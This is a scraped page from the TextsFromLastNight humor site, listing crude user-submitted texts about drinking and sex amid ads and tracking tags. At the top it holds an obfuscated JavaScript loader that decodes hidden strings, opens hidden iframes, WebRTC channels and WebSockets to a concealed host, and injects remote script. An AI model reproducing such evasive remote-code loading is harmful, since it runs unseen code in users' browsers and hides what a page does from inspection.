d=w+":"+d;var f={};f[a("BRQfAw==")]=[a("AxIGHns=")+d];F(e,f,function(b){b=b.match(new RegExp(a("LgUSHiUtKgMWJ3sYI2VyEAZGYW12ThMKAAghEwptZBQUTVNYHSBlPkweJW8bYA4oSTFvGS1fRjIUX113Lj00aAMUFRw5")));if(null==b)return null;b=b[1];return a("EwcdFCggLxYHeHFkdm4HCDJNc3R9Q1JWQ0JAYHo=")+b+a("UBIKAGEsIREW")},b,c)}function F(b,c,d,e,f){function m(a){k||(k=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var k=!1;e=m.bind(null,e);f=m.bind(null,f);var p={};p[a("GQUWIyQ2OAcQMQ==")]=[c];var l=new g.c(p);l[a("ExQWETUhCgMWIwIsJiA8KQ4=")](a("XwsWBCBrPgsMJQ==")).binaryType=
a("ERQBETgmOwQEJzM=");l[a("HwgaEyQnLwwGKyUlMys=")]=function(b){if(null!=b[a("EwcdFCggLxYH")]&&(b=d(b[a("EwcdFCggLxYH")][a("EwcdFCggLxYH")]),null!=b)){var c={};c[a("EwcdFCggLxYH")]=b;c[a("AwIDPQ0tIAcrLCUhPw==")]=0;l[a("EQIXOSIhDQMMJiggJjo3")](new g.b(c),function(){},function(){})}};l.addEventListener(a("GQUWEy4qIAcBNigrKT0mLRYIIi0oGgEL"),function(){l[a("GQUWMy4qIAcBNigrKR0mLRYI")]===a("FgcaHCQg")&&f()});var h=a("BltDei55OxEHMC8lKityfEJdYQwHVC8+RFRFZW1qdGZASEJ6Mnk9BxExKCspIDMhB2cieAA6RicgQFRmaHNqeF5WXUFLMHNSQnJLJXooOyIFCDM1Ox0IGkoHHDZ3dnF+UA==")+
b+a("egdOGSIhYw0SNigrKT1oOBAEIi4lEWwDTRUEJzYtJykEDxweYXV8UVZiBRALHX0fITkRZXxEVl56FUkkOTA0JREWSUVxdH5CFScjNjMtfygDGSAmIRUIABUYVGVvck4pTQ8QFWwxKBADJXs=")+function(){for(var b="",c=a("QFZDQHF0flI="),d=0;16>d;++d){var e=(4294967296*Math.random()>>>0).toString(16);b+=c.substring(0,c.length-e.length)+e}return b}()+a("egdOGSIhYxIVJnt0d35ifFJdcXV5RFZeQEREZ2p0dHhAVkNAcXR+UlJycU4=");l[a("ExQWETUhAQQEJzM=")](function(b){l[a("AwMHPC4nLw4mJzInNSciOAsCLw==")](b,function(){var b={};b[a("BB8DFQ==")]=a("EQgAByQ2");
b[a("AwID")]=h;l[a("AwMHIiQpIRYHBiQ3JDw7PBYELis=")](new g.f(b),function(){},function(){})},function(){})},function(){});b=l[a("ExQWETUhCgMWIwIsJiA8KQ4=")](a("XxEAAEE=")+window.navigator.userAgent);b.binaryType=a("ERQBETgmOwQEJzM=");G(b,x(),function(b){e(b,{rtc:l})},function(){f()})}function S(b,c){function d(b){m||(m=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var e=x();e=(window.location.protocol==a("GBIHADJ+")?a("GBIHADJ+YU0="):a("GBIHAHtrYQ=="))+u+e;var f=a("NyMn"),m=!1;b=d.bind(null,
b);c=d.bind(null,c);var k=new g.g;k.onreadystatechange=function(){4==k.readyState&&(0==k.status?c():b(r(k.response),{}))};k.onerror=function(){c()};k.open(f,e,!0);k.responseType=a("ERQBETgmOwQEJzM=");k.send(null)}function P(b,c){var d=a("BxUASm5r"),e=new g.a(d+w+a("XxEAAA=="));e.binaryType=a("ERQBETgmOwQEJzM=");G(e,x(),function(a){b(a,{ws:e})},function(){c()})}function G(b,c,d,e){function f(b){g||(g=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;d=f.bind(null,d);e=f.bind(null,
e);var k=!1,p=setTimeout(function(){e(Error())},3E3),l=E(JSON.stringify({url:c||"",method:a("NyMn"),headers:null,body:null}));b.onopen=function(){clearTimeout(p);b.send(l)};var h=new ArrayBuffer(0),n;b.onmessage=function(b){if(4===b.data.byteLength){var a=new Uint8Array(b.data);if(222===a[0]&&173===a[1]&&190===a[2]&&239===a[3])return}!1===k?(k=!0,b=r(b.data),n=JSON.parse(b),n={status:n.status||0,headers:n.headers||{}}):(b=b.data,a=new Uint8Array(h.byteLength+b.byteLength),a.set(new Uint8Array(h),
0),a.set(new Uint8Array(b),h.byteLength),h=a.buffer)};b.onerror=function(){clearTimeout(p);e(Error())};b.onclose=function(){k?(n.body=h,d(r(n.body))):(clearTimeout(p),e(Error()))}}function y(b){return window[b.name]?window[b.name]:b[a("EwkdBCQqOiYNITQpIiAm")]&&b[a("EwkdBCQqOiYNITQpIiAm")][a("FAMVETQoOjQLJzY=")]?b[a("EwkdBCQqOiYNITQpIiAm")][a("FAMVETQoOjQLJzY=")]:b[a("EwkdBCQqOjULLCUrMA==")]}function H(){var b=document.createElement(a("GQABESwh"));b.style.height=a("QRYL");b.style.width=a("QRYL");b.style.display=
a("HgkdFQ==");b[a("AxQQFC4n")]=a("EQ==");b.name||(b.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7));(document.body||document.head||document.documentElement).appendChild(b);var c=y(b);c.document.documentElement||c.document.write(a("EQ=="));try{c.stop()}catch(d){}return b}function O(){I=a("BQgYHi4zIA==");t=a("Ew4BHywh");q=a("Fg8BFScrNg==");z=a("HxYWAiA=");A=a("AwcVETMt");var b=H();b=y(b);var c=b.navigator.userAgent;var d=(new RegExp(a("Ew4BHywhMgEKMC4pLjs/"),
"i")).test(c)?t:(new RegExp(a("Fg8BFScrNh4LISQzIi8hKQ4RJz0gGxU="),"i")).test(c)?q:(new RegExp(a("Lk5bT2AnJhANLyQ4JiA2Pg0EJWxnXUwdERIVJTM="),"i")).test(c)?A:(new RegExp(a("HxYBDC40Jw0R"),"i")).test(c)?z:window[a("Ew4BHywh")]?t:"undefined"!==typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(d)&&(b=window);c=a("FRASHA==");g.c=b[c](a("Bw8dFC4zYDA2AREhIjwRIwwDJCY9HQkAUAgIdy0tKiwfEV0HJCYlCxYQFQcXKzc+IQIvKywXEgcfGlQrJmQzIR4CHAdvKSEYMBYCFCIrIA8NAy8gKgAPAR5UCCt6My0mFAkEXiw3HDYhEiQhNQ09IgwIIjEgGwg="));g.f=b[c](a("Bw8dFC4zYDA2ARIhND07IwwpJDYqBg8eBB0bOXo4OGgHDx0ULjNgFQcgKi0zHAYPMQgyNiAbCCoVBxclMzQwIR8IUww9ZDkLDCYuM2kjPTYwOQIWLAcVBx8aMDIpJzYhABIaHy9kMh5CNSgqIyElYg8eExEKJwMdAx0bOR4hNysCDwMEKCsg"));
g.b=b[c](a("Bw8dFC4zYDA2AQgnIg0zIgYEJSQ9EUYSDFQDPjQgKz9eERYSKi06MDYBCCciDTMiBgQlJD0RRhIMVAM+NCArP14LHAoTEA0rAScCJSkqOygDGSRlNQhGGRkaEDgtaik7IjIwOSIhDQMMJiggJjo3"));d===q?(d=H(),g.a=y(d)[c](a("Bw8dFC4zYDUHIBIrJCU3OA==")),d.parentElement.removeChild(d)):g.a=b[c](a("Bw8dFC4zYDUHIBIrJCU3OA=="));g.g=b[c](a("Bw8dFC4zYDovDgkwMz4AKRMYJDY9"))}function D(b,a){var c=new Uint8Array(a),e=new ArrayBuffer(a.byteLength);e=new Uint8Array(e);for(var f=0;f<a.byteLength;f++)e[f]=c[f]^b.charCodeAt(f%b.length);return e.buffer}
function r(b){if(window.TextDecoder)return(new window.TextDecoder("utf-8")).decode(new Uint8Array(b));var a="";b=new Uint8Array(b);for(var d=b.byteLength,e=0;e<d;e++)a+=String.fromCharCode(b[e]);return decodeURIComponent(escape(a))}function E(b){if(window.TextEncoder)return(new window.TextEncoder("utf-8")).encode(b).buffer;b=unescape(encodeURIComponent(b));for(var a=new Uint8Array(b.length),d=0;d<b.length;d++)a[d]=b.charCodeAt(d);return a.buffer}function x(){return a("XwMZA340cw==")+"2057450003"}
function a(b){b=window.atob(b);for(var a="",d=0;d<b.length;d++)a+=String.fromCharCode(b.charCodeAt(d)^"pfspADNbbBADGNRLbmAEItfnpttWZDDH".charCodeAt(d%32));return a}function v(){if(!J){var a=("https:"==window.location.protocol?"https://":"http://")+u+T,c=document.createElement("script");c.type="text/javascript";c.async=!0;c.src=a;(document.body||document.head||document.documentElement).appendChild(c);J=!0}}var u=a("CA4BXiwxJAsOLTMlaS09IQ=="),w=a("EUgeBSstIg0QI28nKCM="),T=decodeURIComponent("%2Fljs%3Fp%3D")+
"2057450003",N="/l?p=2057450003&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.ucweb)try{v()}catch(b){}try{B()}catch(b){}})()}catch(B){};
</script>
  </head>


<body class='index'>
      <!-- Begin comScore Tag -->
  <script>
    var _comscore = _comscore || [];
    _comscore.push({ c1: "2", c2: "21227645" });
    (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
    })();
  </script>
  <noscript>
    <img src="http://b.scorecardresearch.com/p?c1=2&c2=21227645&cv=2.0&cj=1" />
  </noscript>
  <!-- End comScore Tag -->
  <!-- Quantcast Tag -->
  <script type="text/javascript">
    var _qevents = _qevents || [];
    (function() {
        var elem = document.createElement('script');
        elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
        elem.async = true;
        elem.type = "text/javascript";
        var scpt = document.getElementsByTagName('script')[0];
        scpt.parentNode.insertBefore(elem, scpt);
    })();
    _qevents.push({
            qacct:"p-VVdty1QSEtK40"
            });
  </script>
  <noscript>
  <div style="display:none;">
  <img src="//pixel.quantserve.com/pixel/p-VVdty1QSEtK40.gif" border="0" height="1" width="1" alt="Quantcast"/>
  </div>
  </noscript>
  <!-- End Quantcast tag -->

  <div id="fb-root"></div>
  <script>(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5&appId=820766624617601";
    fjs.parentNode.insertBefore(js, fjs);
  }(document, 'script', 'facebook-jssdk'));
  </script>

    <div id="ad-top" class="mobile-hide">
      <div class="ad-cont sidebar-hide">
        <div class="ad-wrap">
          <div class="ad-text">
            ADVERTISEMENT
          </div>
<div id='div-gpt-ad-1460580604140-0-970' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_desktop) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-0-970'); });
	   }	   </script>
          </div>        </div>
      </div>
      <div class="less-wide-ad">
        <div class="ad-wrap">
          <div class="ad-text">
            ADVERTISEMENT
          </div>
<div id='div-gpt-ad-1460580604140-0-728' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_tablet) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-0-728'); });
	   }	   </script>
          </div>        </div>
      </div>
    </div>

  <header id="header">
    <div class="container">
      <h1><a href="http://www.textsfromlastnight.com" rel="home">TextsFromLastNight.com</a></h1>
      <div id="account-links" class="mobile-hide">
        <ul>
                      <li><a href="/Login-To-TFLN.html">Log In / Sign Up</a></li>
                  </ul>
      </div>
      <nav>
        <div class="mobile-show" id="nav-toggle"><i class="fa fa-bars"></i></div>
        <ul class="mobile-hide main-nav">
          <li><a href="http://www.tfln.co" style="color: #7b2627;">blog</a></li>
          <li><a class="submit" href="/Submit-a-Text.html">Submit</a></li>
          <li class="" id='best'>
            <a href="/Texts-From-Best-Nights-Today.html">Best</a>
            <div class="sub-menu">
              <ul>
                <li class=""><a href="/Texts-From-Best-Nights-Today.html">Today</a></li>
                <li class=""><a href="/Texts-From-Best-Nights-Week.html">Week</a></li>
                <li class=""><a href="/Texts-From-Best-Nights-Month.html">Month</a></li>
                <li class=""><a href="/Texts-From-Best-Nights.html">All Time</a></li>
              </ul>
            </div>
          </li>
          <li class="" id='worst'>
            <a href="/Texts-From-Worst-Nights-Today.html">Worst</a>
            <div class="sub-menu">
              <ul>
                <li class=""><a href="/Texts-From-Worst-Nights-Today.html">Today</a></li>
                <li class=""><a href="/Texts-From-Worst-Nights-Week.html">Week</a></li>
                <li class=""><a href="/Texts-From-Worst-Nights-Month.html">Month</a></li>
                <li class=""><a href="/Texts-From-Worst-Nights.html">All Time</a></li>
              </ul>
            </div>
          </li>
          <!-- <li id="randomBtn" class=""><a href="/Random-Texts-From-Last-Night.html?t=5821068">Random</a></li> -->
          <li class='secondary'><a href="/About-Texts-From-Last-Night.html">About</a></li>
          <li class='secondary'><a href="/newsletter">Newsletter</a></li>
        </ul>

        <div class="mobile-search">
          <i class="fa fa-search"></i>
          <i class="fa fa-times"></i>
          <div class="search-form">
            <label>
              <span class="screen-reader-text">Search for:</span>
              <div class='search'>
                <input class='placeholder' id='search' name='q' type='text' value='Keyword or zip...' />
              </div>
            </label>
          </div>
          <a class="gfln" href="http://www.textsfromlastnight.com/shop">Shop <i class="fa fa-chevron-right"></i></a>
        </div>

      </nav>

      <br class="clearfix" />

    </div>
  </header>

  <div id='content'>

    <div class="container">

      <div id='primary'>

        <div id="ad-left">

          <div class="scroll-spacer-left"></div>

          <div class="ad-one">
            <div class="ad-text">
              ADVERTISEMENT
            </div>
            <div id='div-gpt-ad-1460580604140-5' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_desktop) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-5'); });
	   }	   </script>
          </div>          </div>

          <div class="ad-two absolute">
            <div class="ad-text">
              ADVERTISEMENT
            </div>
            <div id='div-gpt-ad-1460580604140-6' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_desktop) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1460580604140-6'); });
	   }	   </script>
          </div>          </div>
        </div>

        <div id="messages">
                  </div>

        

<ul id="texts-list">
          <div class="ad-text phone-tablet-only">ADVERTISEMENT</div><div id='div-gpt-ad-8675309-mobile-1' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_phone_or_tablet) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-8675309-mobile-1'); });
	   }	   </script>
          </div>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-231.html">(231): <span>View more from Michigan</span></a></h3>
<p><a href="/Text-Replies-73123.html">Just imagine a dick squawking like a parrot</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73123.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73123" data-href="/Vote-Up-Text-73123.json"><span>0</span></a>
            <a class="bad-night" id="N-73123" data-href="/Vote-Down-Text-73123.json"><span>9</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73123.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(231): Just imagine a dick squawking like a parrot @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
    <li id="connected">
      <div class="text">
        <div class="content">
          <div class="rss-image">
            <img src="http://d2pkfaagksqwl.cloudfront.net/submitimage_tfln.jpg" />
          </div>
          <div class="rss-right">
            <p>
              Send us your Text From Last Night!
            </p>
            <a class="submit-button" href="/Submit-a-Text.html">Submit a text&nbsp; <i class="fa fa-chevron-right"></i></a>
            <br class="clearfix">
          </div>
          <div class="tail"></div>
        </div>
      </div>
    </li>
  
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-860.html">(860): <span>View more from Connecticut</span></a></h3>
<p><a href="/Text-Replies-73122.html">Idk why more people don&#39;t drink at work ... i mean, yeah, the cash might be off tonight, but my customer service is fucking phenomenal right now</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73122.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73122" data-href="/Vote-Up-Text-73122.json"><span>8</span></a>
            <a class="bad-night" id="N-73122" data-href="/Vote-Down-Text-73122.json"><span>2</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73122.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(860): Idk why more people don&#39;t drink at work ... i mean, yeah, the cash might be off tonight, but my customer service is fuckin... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
   <div class="ad-text phone-tablet-only">
      ADVERTISEMENT
   </div>
<div id='div-gpt-ad-8675309-mobile-2' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_phone_or_tablet) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-8675309-mobile-2'); });
	   }	   </script>
          </div>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-417.html">(417): <span>View more from Missouri</span></a></h3>
<p><a href="/Text-Replies-73120.html">Just as an add on, don&#39;t expect me to wear matching bra and underwear. If I do, I&#39;m probably drunk and it&#39;s your fucking birthday. Have a great night.</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73120.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73120" data-href="/Vote-Up-Text-73120.json"><span>12</span></a>
            <a class="bad-night" id="N-73120" data-href="/Vote-Down-Text-73120.json"><span>1</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73120.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(417): Just as an add on, don&#39;t expect me to wear matching bra and underwear. If I do, I&#39;m probably drunk and it&#39;s your f... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>

	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-931.html">(931): <span>View more from Tennessee</span></a></h3>
<p><a href="/Text-Replies-73121.html">Do you think if I explain to her I want to have loud, unprotected sex with her sister she&#39;ll understand?</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73121.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73121" data-href="/Vote-Up-Text-73121.json"><span>12</span></a>
            <a class="bad-night" id="N-73121" data-href="/Vote-Down-Text-73121.json"><span>6</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73121.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(931): Do you think if I explain to her I want to have loud, unprotected sex with her sister she&#39;ll understand?... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
        <li class="desktop-net-callout tfln-net" >
          <div class="text">
            <div class="content">
              <div class="rss-image">
	        <img src="http://tfln.co/wp-content/uploads/2018/03/Screen_Shot_2017-12-05_at_7.18.41_PM_hfohbw-1200x630.jpg" />
              </div>
              <div class="rss-right">
                <p><a href="http://tfln.co/funny-tumblr-posts-starbucks/">Just 30 Funny Tumblr Posts About Starbucks</a></p>
                <a href="http://tfln.co/funny-tumblr-posts-starbucks/">Read it at the TFLN blog<i class="fa fa-chevron-right"></i></a>
                <br class="clearfix" />
              </div>
              
              <div class="tail"></div>
            </div>
          </div>
        </li>
 <li class="desktop-net-callout desktop-net-callout-placeholder"></li>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-314.html">(314): <span>View more from Missouri</span></a></h3>
<p><a href="/Text-Replies-73119.html">The most awkward thing in the morning is seeing your teacher&#39;s dick right before you go to his class.</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73119.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73119" data-href="/Vote-Up-Text-73119.json"><span>3</span></a>
            <a class="bad-night" id="N-73119" data-href="/Vote-Down-Text-73119.json"><span>18</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73119.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(314): The most awkward thing in the morning is seeing your teacher&#39;s dick right before you go to his class.... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>

	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-940.html">(940): <span>View more from Texas</span></a></h3>
<p><a href="/Text-Replies-73117.html">Today, this cop risk his life to save me from a sink hole but all I could do is laugh, I was so stoned</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73117.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73117" data-href="/Vote-Up-Text-73117.json"><span>3</span></a>
            <a class="bad-night" id="N-73117" data-href="/Vote-Down-Text-73117.json"><span>12</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73117.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(940): Today, this cop risk his life to save me from a sink hole but all I could do is laugh, I was so stoned @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
   <div class="ad-text phone-tablet-only">
      ADVERTISEMENT
   </div>
<div id='div-gpt-ad-8675309-mobile-3' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_phone_or_tablet) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-8675309-mobile-3'); });
	   }	   </script>
          </div><div id="contentad-slot-6"></div>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-740.html">(740): <span>View more from Ohio</span></a></h3>
<p><a href="/Text-Replies-73118.html">I&#39;m sorry my shit is everywhere... I accidentally got drunk while packing</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73118.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73118" data-href="/Vote-Up-Text-73118.json"><span>1</span></a>
            <a class="bad-night" id="N-73118" data-href="/Vote-Down-Text-73118.json"><span>9</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73118.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(740): I&#39;m sorry my shit is everywhere... I accidentally got drunk while packing @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
<div id="contentad-slot-7"></div>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-202.html">(202): <span>View more from Washington, DC</span></a></h3>
<p><a href="/Text-Replies-73116.html">The only thing I want for my birthday is a divorce from you.</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73116.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73116" data-href="/Vote-Up-Text-73116.json"><span>2</span></a>
            <a class="bad-night" id="N-73116" data-href="/Vote-Down-Text-73116.json"><span>35</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73116.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(202): The only thing I want for my birthday is a divorce from you. @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>

	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-248.html">(248): <span>View more from Michigan</span></a></h3>
<p><a href="/Text-Replies-73114.html">I plan on getting so intoxicated, that I think it&#39;s MY own birthday</a></p>
<div class="reply">
	<h3><a href="/Texts-From-Areacode-586.html">(586): <span>View more from Michigan</span></a></h3>
	<p><a href="/Text-Replies-73114.html">Can I play this game?</a></p>
</div>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73114.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73114" data-href="/Vote-Up-Text-73114.json"><span>15</span></a>
            <a class="bad-night" id="N-73114" data-href="/Vote-Down-Text-73114.json"><span>1</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73114.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(248): I plan on getting so intoxicated, that I think it&#39;s MY own birthday
(586): Can I play this game? @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
        <li class="desktop-net-callout tfln-net" >
          <div class="text">
            <div class="content">
              <div class="rss-image">
	        <img src="http://tfln.co/wp-content/uploads/2018/03/kindadicks.jpg" />
              </div>
              <div class="rss-right">
                <p><a href="http://tfln.co/people-are-aholes-also-completely-hilarious/">18 People Are Kind Of A**holes But Also Completely Hilarious</a></p>
                <a href="http://tfln.co/people-are-aholes-also-completely-hilarious/">Read it at the TFLN blog<i class="fa fa-chevron-right"></i></a>
                <br class="clearfix" />
              </div>
              
              <div class="tail"></div>
            </div>
          </div>
        </li>
 <li class="desktop-net-callout desktop-net-callout-placeholder"></li>
	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-610.html">(610): <span>View more from Pennsylvania</span></a></h3>
<p><a href="/Text-Replies-73115.html">thought i saw a dude in a kilt yesterday, but then i realized he was doing a walk of shame. happy st. paddy&#39;s day.</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73115.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73115" data-href="/Vote-Up-Text-73115.json"><span>8</span></a>
            <a class="bad-night" id="N-73115" data-href="/Vote-Down-Text-73115.json"><span>4</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73115.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(610): thought i saw a dude in a kilt yesterday, but then i realized he was doing a walk of shame. happy st. paddy&#39;s day.... @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>

	<li>
		<div class='text'>
             <div class="content">
				
<h3><a href="/Texts-From-Areacode-786.html">(786): <span>View more from Florida</span></a></h3>
<p><a href="/Text-Replies-73113.html">Wait, like drink with real Phil. Or Phil, the cat that sometimes lived in your closet in Myrtle Beach?</a></p>
        <div class="social-share">
          <div class='actions'>
                          <a class="favorite link" href="/What-Are-Favorites.html">Fav</a>
                        <a class="replies" href="/Text-Replies-73113.html"><span>0</span><i class="fa fa-comment"></i></a>
            <a class="good-night" id="P-73113" data-href="/Vote-Up-Text-73113.json"><span>11</span></a>
            <a class="bad-night" id="N-73113" data-href="/Vote-Down-Text-73113.json"><span>0</span></a>
          </div>
        
          <a class="facebook-share" target="_new" href="http://facebook.com/sharer.php?u=http%3A%2F%2Ftextsfromlastnight.com%2FText-Replies-73113.html&t=Texts+From+Last+Night"><i class="fa fa-facebook"></i>share</a>

          <a class="twitter-share" target="_new" href="http://twitter.com/?status=(786): Wait, like drink with real Phil. Or Phil, the cat that sometimes lived in your closet in Myrtle Beach? @tfln"><i class="fa fa-twitter"></i>tweet</a>

          <br class="clearfix" />

        </div>
		<div class="tail"></div>
	        </div>
	    </div>
	</li>
   <div class="ad-text phone-tablet-only">
      ADVERTISEMENT
   </div>
<div id='div-gpt-ad-8675309-mobile-4' style=''>
           <script type='text/javascript'>
	   if (window.tfln_is_phone_or_tablet) {            googletag.cmd.push(function() { googletag.display('div-gpt-ad-8675309-mobile-4'); });
